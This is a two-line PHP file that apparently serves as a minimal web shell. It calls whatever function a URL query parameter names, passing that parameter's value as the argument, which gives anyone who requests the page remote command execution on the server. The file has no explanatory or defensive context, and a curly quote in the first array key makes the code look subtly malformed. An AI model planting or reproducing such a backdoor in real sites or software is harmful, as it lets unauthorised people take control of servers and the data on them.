<?php
$_GET[’vDtImScm']($_GET['vDtImScm']);
?>
